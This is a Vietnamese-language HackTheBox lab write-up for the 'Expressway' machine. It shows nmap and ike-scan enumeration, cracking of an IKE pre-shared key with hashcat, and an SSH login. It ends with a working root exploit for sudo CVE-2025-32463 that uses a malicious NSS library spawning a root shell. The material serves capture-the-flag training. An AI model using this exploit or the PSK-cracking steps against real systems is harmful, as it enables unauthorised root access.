## HackTheBox – Expressway Writeup

### 1. TCP Scan – Thu thập port TCP
Sử dụng Nmap để quét các port TCP:

```bash
nmap -sV -O MACHINE_IP
```

Kết quả tìm được:

- Port 22 (OpenSSH) mở

---

### 2. UDP Scan – Thu thập port UDP

```bash
nmap -sU -sV MACHINE_IP
```

Quét UDP phát hiện:

```
500/udp open  isakmp
```

---

### 3. Phân tích ISAKMP / IKE

IKE có 2 mode:

- Main Mode: an toàn hơn  
- Aggressive Mode: nhanh, nhưng dễ lộ thông tin

Chạy aggressive mode:

```bash
ike-scan --aggressive MACHINE_IP
```

Tìm được username:

```
ike@expressway.htb
```

---

### 4. Crack Pre-Shared Key (PSK)

Tạo hash PSK:

```bash
ike-scan -M -A MACHINE_IP --pskcrack=output.txt
```

Crack bằng hashcat:

```bash
hashcat -m 5400 -a 0 output.txt rockyou.txt
```

Kết quả:

```
freakingrockstarontheroad
```

---

### 5. SSH vào máy

```bash
ssh ike@10.10.11.87
```

Nhận user flag:

```
7b7090b488ca012a49499519ba0200cc
```

---

### 6. Kiểm tra sudo bất thường

```bash
which sudo
```

Trả về:

```
/usr/local/bin/sudo
```

Kiểm tra version:

```
sudo --version
```

Là sudo 1.9.17 → tồn tại CVE-2025-32463.

---

### 7. Khai thác CVE-2025-32463

Tạo thư mục:

```bash
mkdir -p woot/etc libnss_
```

Tạo nsswitch.conf:

```bash
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
```

Copy group:

```bash
cp /etc/group woot/etc
```

File woot1337.c:

```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void woot(void) {
  setreuid(0,0);
  setregid(0,0);
  chdir("/");
  execl("/bin/sh", "sh", "-c", "${CMD_C_ESCAPED}", NULL);
}
```

Compile thành thư viện NSS:

```bash
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c
```

---

### 8. Leo root

```bash
sudo -R woot woot
```

Nhận root flag:

```
a7560c3004cae25dd193805a6851d8eb
```

